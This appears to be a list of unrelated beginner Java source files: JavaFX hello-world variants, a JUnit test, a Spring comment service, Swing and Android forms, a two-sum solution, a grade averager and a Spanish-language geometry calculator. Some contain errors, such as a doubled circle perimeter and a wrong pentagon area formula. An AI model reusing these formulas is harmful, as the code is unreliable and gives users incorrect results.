    "package asuHelloWorldJavaFX;\n\nimport javafx.application.Application;\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.layout.StackPane;\nimport javafx.stage.Stage;\n \npublic class ASUHelloWorldJavaFX extends Application {\n    public static void main(String[] args) {\n        launch(args);\n    }\n    \n    public void start(Stage primaryStage) {\n    \tSystem.out.println(\"ASU Hello World!\");\n    \tSystem.out.println(\"It started!\");\n        primaryStage.setTitle(\"ASU Hello World Spring 2024\");\n        Button btn = new Button();\n        btn.setText(\"Display: 'ASU says: Hello World!'\");\n        btn.setOnAction(new EventHandler<>() {\n            public void handle(ActionEvent event) {\n                System.out.println(\"ASU: Hello World!\");\n            }\n        });\n        \n        StackPane root = new StackPane();\n        root.getChildren().add(btn);\n        primaryStage.setScene(new Scene(root, 300, 250));\n        primaryStage.show();\n    }\n}",
    "package asuHelloWorldJavaFX;\n\nimport javafx.application.Application;\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.layout.StackPane;\nimport javafx.stage.Stage;\n \npublic class ASUHelloWorldJavaFX extends Application {\n    public static void main(String[] args) {\n        launch(args);\n    }\n    \n    public void start(Stage primaryStage) {\n    \tSystem.out.println(\"ASU Hello World!\");\n    \tSystem.out.println(\"It started!\");\n        primaryStage.setTitle(\"In class Github activity\");\n        Button btn = new Button();\n        btn.setText(\"'Paul Palacios second commit'\");\n        btn.setOnAction(new EventHandler<>() {\n            public void handle(ActionEvent event) {\n                System.out.println(\"ASU: Hello World!\");\n            }\n        });\n        \n        StackPane root = new StackPane();\n        root.getChildren().add(btn);\n        primaryStage.setScene(new Scene(root, 300, 250));\n        primaryStage.show();\n    }\n}",
    "package edu.ucsb.cs156.pconrad.menuitem;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertThrows;\n\nimport org.junit.jupiter.api.Test;\n\nimport edu.ucsb.cs156.pconrad.menuitem.MenuItem;\n\npublic class MenuItemTest {\n\n    private MenuItem smallPokeBowl;\n\n\n    @Test\n    public void test_getPrice() {\n        smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n        assertEquals(\"$10.49\", smallPokeBowl.getPrice());\n    }\n\n    @Test\n    public void test_getPrice_10() {\n        smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n        assertEquals(\"    $10.49\", smallPokeBowl.getPrice(10));\n    }\n\n    @Test\n    public void test_getPrice_7() {\n        smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n        assertEquals(\" $10.49\", smallPokeBowl.getPrice(7));\n    }\n\n    @Test\n    public void test_getPrice_6() {\n        smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n        assertEquals(\"$10.49\", smallPokeBowl.getPrice(6));\n    }\n\n    @Test\n    public void test_getPrice_5() {\n        assertThrows(MenuItem.TooNarrowException.class, () -> {\n            smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n            smallPokeBowl.getPrice(5);\n        });\n    }\n\n    @Test\n    public void test_getPrice_0() {\n        assertThrows(MenuItem.TooNarrowException.class, () -> {\n            smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n            smallPokeBowl.getPrice(0);\n        });\n    }\n\n    @Test\n    public void test_toString() {\n        smallPokeBowl = new MenuItem(\"Small Poke Bowl\", 1049, \"Poke Bowls\");\n        assertEquals(\"Small Poke Bowl,1049,Poke Bowls\", smallPokeBowl.toString());\n    }\n\n}\n",
    "package data;\n\nimport com.github.javafaker.Faker;\nimport lombok.Value;\n\nimport java.time.LocalDate;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Locale;\nimport java.util.Random;\n\npublic class DataGenerator {\n    private DataGenerator() {\n    }\n\n    public static String generateDate(int shift) {\n        // \u0434\u043e\u0431\u0430\u0432\u044f\u0435\u043c \u043b\u043e\u0433\u0438\u043a\u0443 \u0434\u043b\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 date \u0438 \u0437\u0430\u0434\u0430\u043d\u0438\u044f \u0435\u0451 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f, \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0441\u0442\u0440\u043e\u043a\u0438 \u0441 \u0434\u0430\u0442\u043e\u0439\n        // \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c \u043a\u043b\u0430\u0441\u0441 LocalDate \u0438 \u0435\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u044b \u0434\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u0438 \u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f \u0434\u0430\u0442\u044b\n        return LocalDate.now().plusDays(shift).format(DateTimeFormatter.ofPattern(\"dd.MM.yyyy\"));\n    }\n\n    public static String generateCity() {\n        // \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043b\u043e\u0433\u0438\u043a\u0443 \u0434\u043b\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 city \u0438 \u0437\u0430\u0434\u0430\u043d\u0438\u044f \u0435\u0451 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f,\n        // \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044e \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c, \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044f \u043c\u0430\u0441\u0441\u0438\u0432 \u0432\u0430\u043b\u0438\u0434\u043d\u044b\u0445 \u0433\u043e\u0440\u043e\u0434\u043e\u0432 \u0438 \u043a\u043b\u0430\u0441\u0441 Random\n        Random random = new Random();\n        var cities = new String[]{\"\u0423\u0444\u0430\", \"\u0419\u043e\u0448\u043a\u0430\u0440-\u041e\u043b\u0430\", \"\u041f\u0435\u0442\u0440\u043e\u0437\u0430\u0432\u043e\u0434\u0441\u043a\", \"\u0421\u0430\u0440\u0430\u043d\u0441\u043a\", \"\u041a\u0430\u0437\u0430\u043d\u044c\", \"\u0418\u0436\u0435\u0432\u0441\u043a\", \"\u041f\u0435\u0440\u043c\u044c\",\n                \"\u0412\u043b\u0430\u0434\u0438\u0432\u043e\u0441\u0442\u043e\u043a\", \"\u0425\u0430\u0431\u0430\u0440\u043e\u0432\u0441\u043a\", \"\u0410\u0440\u0445\u0430\u043d\u0433\u0435\u043b\u044c\u0441\u043a\", \"\u041d\u043e\u0432\u043e\u0441\u0438\u0431\u0438\u0440\u0441\u043a\", \"\u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u0431\u0443\u0440\u0433\", \"\u0418\u0440\u043a\u0443\u0442\u0441\u043a\",\n                \"\u041a\u0438\u0440\u043e\u0432\", \"\u0421\u0430\u043d\u043a\u0442-\u041f\u0435\u0442\u0435\u0440\u0431\u0443\u0440\u0433\", \"\u0422\u044e\u043c\u0435\u043d\u044c\", \"\u0427\u0435\u043b\u044f\u0431\u0438\u043d\u0441\u043a\", \"\u0420\u043e\u0441\u0442\u043e\u0432-\u043d\u0430-\u0414\u043e\u043d\u0443\"};\n        return cities[random.nextInt(cities.length)];\n    }\n\n    public static String generateName(String locale) {\n        // \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043b\u043e\u0433\u0438\u043a\u0443 \u0434\u043b\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 name \u0438 \u0437\u0430\u0434\u0430\u043d\u0438\u044f \u0435\u0451 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f,\n        // \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c Faker\n        Faker faker = new Faker(new Locale(locale));\n        return faker.name().lastName() + \" \" + faker.name().firstName();\n    }\n\n    public static String generatePhone(String locale) {\n        // \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043b\u043e\u0433\u0438\u043a\u0443 \u0434\u043b\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 phone \u0438 \u0437\u0430\u0434\u0430\u043d\u0438\u044f \u0435\u0451 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f,\n        // \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c Faker\n        Faker faker = new Faker(new Locale(locale));\n        return faker.phoneNumber().phoneNumber();\n    }\n\n    public static class Registration {\n        private Registration() {\n        }\n\n        public static UserInfo generateUser(String locale) {\n            // \u0434\u043e\u0431\u0430\u0432\u044f\u0435\u043c \u043b\u043e\u0433\u0438\u043a\u0443 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f user \u0441 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435\u043c\n            // \u043c\u0435\u0442\u043e\u0434\u043e\u0432 generateCity(locale), generateName(locale), generatePhone(locale)\n            return new UserInfo(generateCity(), generateName(locale), generatePhone(locale));\n        }\n    }\n\n    @Value\n    public static class UserInfo {\n        String city;\n        String name;\n        String phone;\n    }\n}",
    "package africa.semicolon.services;\n\nimport africa.semicolon.data.models.Comment;\nimport africa.semicolon.data.models.Post;\nimport africa.semicolon.data.repositories.CommentRepository;\nimport africa.semicolon.dto.requests.CommentPostRequest;\nimport africa.semicolon.dto.requests.DeleteCommentRequest;\nimport africa.semicolon.exceptions.CommentNotFoundException;\nimport africa.semicolon.exceptions.PostNotFoundException;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\nimport java.util.Optional;\n\nimport static africa.semicolon.utils.Mapper.requestMap;\n\n@Service\npublic class CommentServicesImpl implements CommentServices{\n    @Autowired\n    CommentRepository commentRepository;\n\n    @Override\n    public Comment saveComment(CommentPostRequest commentPostRequest) {\n        Comment comment = requestMap(commentPostRequest);\n        commentRepository.save(comment);\n        return comment;\n    }\n\n    @Override\n    public long countNoOfViews() {\n        return commentRepository.count();\n    }\n\n    @Override\n    public Comment findCommentById(String id) {\n        Optional<Comment> comment = commentRepository.findById(id);\n        if (comment.isEmpty()) throw new CommentNotFoundException(\"Comment not found\");\n        return comment.get();\n    }\n\n    @Override\n    public Comment removeComment(DeleteCommentRequest deleteCommentRequest) {\n        Comment comment = findCommentById(deleteCommentRequest.getCommentId());\n        commentRepository.delete(comment);\n        return comment;\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage pedrapapeltesoura;\n\n/**\n *\n * @author pc\n */\npublic class Jokenpo extends javax.swing.JFrame {\n\n    /**\n     * Creates new form Jokenpo\n     */\n    public Jokenpo() {\n        initComponents();\n    }\n     public static int randInt(int min, int max) {\n        java.util.Random rand = new java.util.Random();\n        return rand.nextInt((max - min) + 1) + min;\n    }\n    \n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        escolhaPc = new javax.swing.JLabel();\n        jLabel1 = new javax.swing.JLabel();\n        pedra = new javax.swing.JButton();\n        papel = new javax.swing.JButton();\n        tesoura = new javax.swing.JButton();\n        jLabel2 = new javax.swing.JLabel();\n        vencedor = new javax.swing.JLabel();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        escolhaPc.setFont(new java.awt.Font(\"Verdana\", 1, 14)); // NOI18N\n        escolhaPc.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI\", 0, 36)); // NOI18N\n        jLabel1.setText(\"JOKENPO\");\n\n        pedra.setText(\"Pedra\");\n        pedra.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                pedraActionPerformed(evt);\n            }\n        });\n\n        papel.setText(\"Papel\");\n        papel.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                papelActionPerformed(evt);\n            }\n        });\n\n        tesoura.setText(\"Tesoura\");\n        tesoura.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                tesouraActionPerformed(evt);\n            }\n        });\n\n        jLabel2.setText(\"Escolha uma op\u00e7\u00e3o para jogar:\");\n\n        vencedor.setFont(new java.awt.Font(\"Verdana\", 1, 14)); // NOI18N\n        vencedor.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n\n        jLabel3.setFont(new java.awt.Font(\"Verdana\", 0, 12)); // NOI18N\n        jLabel3.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel3.setText(\"RESULTADO:\");\n\n        jLabel4.setFont(new java.awt.Font(\"Segoe UI\", 0, 14)); // NOI18N\n        jLabel4.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);\n        jLabel4.setText(\"Pc jogou:\");\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(115, 115, 115)\n                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                            .addComponent(jLabel2)\n                            .addComponent(jLabel1)))\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(17, 17, 17)\n                        .addComponent(pedra, javax.swing.GroupLayout.PREFERRED_SIZE, 104, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                        .addComponent(papel, javax.swing.GroupLayout.PREFERRED_SIZE, 123, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addGap(18, 18, 18)\n                        .addComponent(tesoura, javax.swing.GroupLayout.PREFERRED_SIZE, 115, javax.swing.GroupLayout.PREFERRED_SIZE))\n                    .addGroup(layout.createSequentialGroup()\n                        .addContainerGap()\n                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                            .addComponent(jLabel4, javax.swing.GroupLayout.PREFERRED_SIZE, 73, javax.swing.GroupLayout.PREFERRED_SIZE)\n                            .addComponent(escolhaPc, javax.swing.GroupLayout.PREFERRED_SIZE, 73, javax.swing.GroupLayout.PREFERRED_SIZE))\n                        .addGap(76, 76, 76)\n                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.L",
    "package asuHelloWorldJavaFX;\n\nimport javafx.application.Application;\nimport javafx.event.ActionEvent;\nimport javafx.event.EventHandler;\nimport javafx.scene.Scene;\nimport javafx.scene.control.Button;\nimport javafx.scene.layout.StackPane;\nimport javafx.stage.Stage;\n \npublic class ASUHelloWorldJavaFX extends Application {\n    public static void main(String[] args) {\n        launch(args);\n    }\n    // WOW THIS COMMENT WAS SUCCESFULLY PUT ON GITHUB!!!!\n    public void start(Stage primaryStage) {\n    \tSystem.out.println(\"ASU Hello World!\");\n    \tSystem.out.println(\"It started!\");\n        primaryStage.setTitle(\"ASU Hello World Spring 2024\");\n        Button btn = new Button();\n        btn.setText(\"Display: 'ASU says: Hello World!'\");\n        btn.setOnAction(new EventHandler<>() {\n            public void handle(ActionEvent event) {\n                System.out.println(\"ASU: Hello World!\");\n            }\n        });\n        \n        StackPane root = new StackPane();\n        root.getChildren().add(btn);\n        primaryStage.setScene(new Scene(root, 300, 250));\n        primaryStage.show();\n    }\n}",
    "package com.example.quiz5;\n\nimport android.Manifest;\nimport android.content.DialogInterface;\nimport android.content.Intent;\nimport android.content.pm.PackageManager;\nimport android.net.Uri;\nimport android.nfc.Tag;\nimport android.os.Build;\nimport android.os.Bundle;\nimport android.os.Environment;\nimport android.provider.Settings;\nimport android.util.Log;\nimport android.util.Rational;\nimport android.widget.Button;\nimport android.widget.Toast;\n\nimport androidx.activity.result.ActivityResultLauncher;\nimport androidx.activity.result.contract.ActivityResultContracts;\nimport androidx.annotation.NonNull;\nimport androidx.appcompat.app.AlertDialog;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.core.app.ActivityCompat;\nimport androidx.core.content.ContextCompat;\n\nimport com.example.quiz5.Gallery.GalleryActivity;\nimport com.example.quiz5.Quiz.QuizActivity;\n\npublic class MainActivity extends AppCompatActivity {\n\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        Button galleryButton = findViewById(R.id.MAIN_galleryButton);\n        galleryButton.setOnClickListener(l -> {openGallery();});\n\n        Button quizButton = findViewById(R.id.Quiz);\n        quizButton.setOnClickListener(l -> {openQuiz();});\n\n    }\n\n    private void openGallery(){\n        Intent intent = new Intent(MainActivity.this, GalleryActivity.class);\n        startActivity(intent);\n    }\n\n    private void openQuiz(){\n        Intent intent = new Intent(MainActivity.this, QuizActivity.class);\n        startActivity(intent);\n    }\n\n    /*\n    private void requestRuntimePermission(){\n        if (ContextCompat.checkSelfPermission(MainActivity.this, READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED){\n            is_storage_image_permitted = true;\n            Intent intent = new Intent(MainActivity.this, GalleryActivity.class);\n            startActivity(intent);\n        } else {\n            request_permission_launcher_storage_items.launch(READ_MEDIA_IMAGES);\n        }\n    }\n\n    /*\n    private ActivityResultLauncher<String> request_permission_launcher_storage_items =\n            registerForActivityResult(new ActivityResultContracts.RequestPermission(),\n                    isGranted -> {\n                    if (isGranted){\n                        Log.d(\"Media\", READ_MEDIA_IMAGES + \" Granted\");\n                    } else {\n                        Log.d(\"Media\", READ_MEDIA_IMAGES + \" is not granted\");\n                        is_storage_image_permitted = false;\n                    }\n                    });\n\n    /*\n    private void requestRuntimePermission(){\n        //Permission for sdk between 23 and 29\n        if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M && Build.VERSION.SDK_INT<Build.VERSION_CODES.R){\n            if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED){\n                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQUEST_EXTERNAL_STORAGE);\n            }\n            //Permission storage for sdk 30 or above\n        } else if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.R) {\n            if (!Environment.isExternalStorageManager()){\n                try {\n                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);\n                    intent.addCategory(\"android.intent.category.DEFAULT\");\n                    intent.setData(Uri.parse(String.format(\"package:%s\", getApplicationContext().getPackageName())));\n                    startActivityIfNeeded(intent, REQUEST_SETTINGS_INTENT);\n                } catch(Exception e){\n                    Intent intent = new Intent();\n                    intent.setAction(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);\n                    startActivityIfNeeded(intent, REQUEST_SETTINGS_INTENT);\n                }\n            }\n        }\n\n    }\n    /*\n    @Override\n    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {\n        super.onRequestPermissionsResult(requestCode, permissions, grantResults);\n        if (requestCode == REQUEST_EXTERNAL_STORAGE){\n            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){\n                Toast.makeText(this, \"Permission granted, you can read external storage\", Toast.LENGTH_SHORT).show();\n            } else if (!ActivityCompat.shouldShowRequestPermissionRationale(this, READ_EXTERNAL_STORAGE)) {\n                AlertDialog.Builder builder = new AlertDialog.Builder(this);\n                builder.setMessage(\"This app needs to read external storage to work, please allow Read external storage permission from\" +\n                        \"settings to proceed\");\n                builder.setTitle(\"Permission required\")\n                        .setCancel",
    "package com.example;\n\nimport java.util.Scanner;\n\npublic class Main {\n\n    private static boolean isRunning = true;\n    public static void main(String[] args) {\n        while(isRunning){\n            showMenu();\n        }\n    }\n    public static void showMenu(){\n        System.out.println(\"Welcome to the To-Do List Application!\");\n        System.out.println(\"1. Log in\");\n        System.out.println(\"2. Sing up\");\n        System.out.println(\"3. Exit\");\n        System.out.print(\"Enter your choice: \");\n\n        Scanner scanner = new Scanner(System.in);\n        int choice = scanner.nextInt();\n\n        handleMenu(choice);\n    }\n    public static void handleMenu(int choice) {\n        switch(choice) {\n            case 2:\n                onSignUp();\n                break;\n            case 3:\n                onExit();\n                break;\n            default:\n                System.out.println(\"Invalid choice!\");\n                showMenu();\n        }\n    }\n\n    public static void onExit() {\n        isRunning = false;\n    }\n\n    public static void onSignUp() {\n        System.out.println(\"Enter your username: \");\n        Scanner scanner = new Scanner(System.in);\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        // TODO Later: Add the to-do list operations\n\n    }\n\n    public static void onLogIn() {\n        System.out.println(\"Enter your username: \");\n        Scanner scanner = new Scanner(System.in);\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        // TODO Later: Shows a message based on the result\n    }\n}\n",
    "package twoSum;\n\nimport java.util.HashMap;\n\npublic class Solution {\n\t// Brute Force\n\t// N is the size of nums\n    // Time Complexity: O(N^2)\n    // Space COmplexity: O(1)\n\t/*\n\tpublic static int[] twoSum(int[] nums, int target) {\n        int[] result = new int[2];\n        for (int i = 0; i < nums.length; i++) {\n            for (int j = i+1; j < nums.length; j++) {\n                int sum = nums[i] + nums[j];\n                if (sum == target) {\n                    result[0] = i;\n                    result[1] = j;\n                    return result;\n                }\n            }\n        }\n        return result;\n    }\n\t*/\n\t\n\t// HashMap\n\t// N is the size of nums\n    // Time Complexity: O(N)\n    // Space COmplexity: O(N)\n\tpublic static int[] twoSum(int[] nums, int target) {\n        int[] result = new int[2];\n        HashMap<Integer, Integer> map = new HashMap<>();\n        for (int i = 0; i < nums.length; i++) {\n            map.put(nums[i], i);\n        }\n        for (int j = 0; j < nums.length; j++) {\n            int diff = target - nums[j];\n            if (map.containsKey(diff) && map.get(diff) != j) {\n                result[0] = j;\n                result[1] = map.get(diff);\n                return result;\n            }\n        }\n        return result;\n    }\n\t\n\t\n\tpublic static void main(String[] args) {\n\t\tint[] nums = {3, 2, 4};\n\t\tint[] result = twoSum(nums, 6);\n\t\tfor (int x : result) {\n\t\t\tSystem.out.println(x);\n\t\t}\n\t}\n}\n",
    "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner n1 = new Scanner(System.in);\n        Scanner n2 = new Scanner(System.in);\n        Scanner n3 = new Scanner(System.in);\n        Scanner n4 = new Scanner(System.in);\n\n\n        System.out.println(\"Digite a primeira nota: \");\n        int nota1 = n1.nextInt();\n\n        System.out.println(\"Digite a segunda nota: \");\n        int nota2 = n2.nextInt();\n\n        System.out.println(\"Digite a terceira nota: \");\n        int nota3 = n3.nextInt();\n\n        System.out.println(\"Digite a quarta nota: \");\n        int nota4 = n4.nextInt();\n\n        int media = (nota1+nota2+nota3+nota4) / 4;\n\n        if(media >= 7){\n            System.out.println(\"sua m\u00e9dia \u00e9 \" + media + \" voc\u00ea est\u00e1 aprovado! \");\n        } else if (media >=5 ) {\n            System.out.println(\"sua m\u00e9dia \u00e9 \" + media + \" voc\u00ea est\u00e1 de recupera\u00e7\u00e3o \");\n            \n        } else if (media < 5 ) {\n            System.out.println(\"sua m\u00e9dia \u00e9 \" + media + \" voc\u00ea est\u00e1 reprovado \");\n\n    }   }\n}",
    "import java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        int figuEleg, operation;\n        double resul, rad, diame, lad, alt, base, lad1, lad2, lad3, semiPeri, longi, anch;\n\n        System.out.println(\"\\n\\n\\t\\tCalculadora Geom\u00e9trica\");\n        System.out.println(\"\\n\\t\\tPor favor, elige una figura:\");\n        System.out.println(\"\\t1. C\u00edrculo\");\n        System.out.println(\"\\t2. Cuadrado\");\n        System.out.println(\"\\t3. Tri\u00e1ngulo\");\n        System.out.println(\"\\t4. Rect\u00e1ngulo\");\n        System.out.println(\"\\t5. Pent\u00e1gono\");\n        System.out.print(\"\\n\\tIngresa el n\u00famero de tu elecci\u00f3n: \");\n        figuEleg = scanner.nextInt();\n\n        System.out.println(\"\\n\\tElige una operaci\u00f3n: \");\n        System.out.println(\"\\t1. \u00c1rea\");\n        System.out.println(\"\\t2. Per\u00edmetro\");\n        System.out.print(\"\\n\\tIngresa el n\u00famero de tu elecci\u00f3n: \");\n        operation = scanner.nextInt();\n\n        switch (figuEleg) {\n            case 1:\n                if (operation == 1) {\n\n                    System.out.print(\"\\n\\t\\ttIngresa el radio del c\u00edrculo: \");\n                    rad = scanner.nextDouble();\n                    resul = 3.1416 * rad * rad;\n\n                    System.out.println(\"\\n\\tEl \u00e1rea del c\u00edrculo es: \" + resul);\n                } else {\n                    System.out.print(\"\\tIngresa el di\u00e1metro del c\u00edrculo: \");\n                    diame = scanner.nextDouble();\n                    resul = 3.1416 * diame;\n\n                    System.out.println(\"\\tEl per\u00edmetro del c\u00edrculo es: \" + resul * 2);\n                }\n                break;\n            case 2:\n                if (operation == 1) {\n\n                    System.out.print(\"\\n\\t\\tIngresa la longitud del lado del cuadrado: \");\n                    lad = scanner.nextDouble();\n                    resul = lad * lad;\n\n                    System.out.println(\"\\tEl \u00e1rea del cuadrado es: \" + resul);\n                } else {\n                    System.out.print(\"\\tIngresa la longitud de un lado del cuadrado: \");\n                    lad = scanner.nextDouble();\n                    resul = 4 * lad;\n\n                    System.out.println(\"\\tEl per\u00edmetro del cuadrado es: \" + resul);\n                }\n                break;\n            case 3:\n                if (operation == 1) {\n\n                    System.out.print(\"\\n\\t\\tIngresa la base y la altura del tri\u00e1ngulo (separados por un espacio): \");\n                    base = scanner.nextDouble();\n                    alt= scanner.nextDouble();\n                    resul = 0.5 * base * alt;\n                    System.out.println(\"\\tEl \u00e1rea del tri\u00e1ngulo es: \" + resul);\n                } else {\n                    System.out.print(\"\\tIngresa la longitud de los tres lados del tri\u00e1ngulo (separados por un espacio): \");\n                    lad1 = scanner.nextDouble();\n                    lad2 = scanner.nextDouble();\n                    lad3 = scanner.nextDouble();\n                    semiPeri = (lad1 + lad2 + lad3) / 2;\n                    resul = lad1 + lad2 + lad3;\n\n                    System.out.println(\"\\tEl per\u00edmetro del tri\u00e1ngulo es: \" + resul);\n                }\n                break;\n            case 4:\n                if (operation == 1) {\n\n                    System.out.print(\"\\n\\t\\tIngresa la longitud y el ancho del rect\u00e1ngulo (separados por un espacio): \");\n                    longi= scanner.nextDouble();\n                    anch = scanner.nextDouble();\n                    resul = longi * anch;\n                    System.out.println(\"\\tEl \u00e1rea del rect\u00e1ngulo es: \" + resul);\n\n                } else {\n\n                    System.out.print(\"\\tIngresa la longitud y el ancho del rect\u00e1ngulo (separados por un espacio): \");\n                    longi= scanner.nextDouble();\n                    anch = scanner.nextDouble();\n                    resul = 2 * (longi + anch);\n                    System.out.println(\"\\tEl per\u00edmetro del rect\u00e1ngulo es: \" + resul);\n                }\n                break;\n            case 5:\n\n                if (operation == 1) {\n\n                    System.out.print(\"\\n\\t\\tIngresa la longitud de un lado del pent\u00e1gono: \");\n                    lad = scanner.nextDouble();\n                    resul = 0.5 * lad * lad * (2.2361+ 5) * 0.2;\n                    System.out.println(\"\\tEl \u00e1rea del pent\u00e1gono es: \" + resul);\n\n                } else {\n\n                    System.out.print(\"\\tIngresa la longitud de un lado del pent\u00e1gono: \");\n                    lad = scanner.nextDouble();\n                    resul = 5 * lad;\n                    System.out.println(\"\\tEl per\u00edmetro del pent\u00e1gono es: \" + resul);\n                }\n                break;\n        }\n    }\n}",
